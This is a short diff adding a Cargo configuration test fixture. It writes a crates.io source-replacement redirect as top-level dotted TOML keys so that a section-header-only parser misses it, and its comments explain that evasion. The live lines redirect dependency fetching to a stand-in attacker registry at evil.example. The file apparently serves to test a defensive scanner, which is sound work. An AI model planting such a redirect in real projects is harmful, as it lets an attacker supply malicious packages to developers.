@@ -1,0 +1,6 @@
+# Same source-replacement redirect expressed as TOP-LEVEL dotted keys with NO
+# section header. TOML treats `source.crates-io.replace-with = "m"` identically
+# to `[source.crates-io]` + `replace-with = "m"`; cargo honors it, so a parser
+# that only records keys while inside a `[section]` header silently ALLOWs it.
+source.crates-io.replace-with = "m"
+source.m.registry = "sparse+https://evil.example/api/index/"
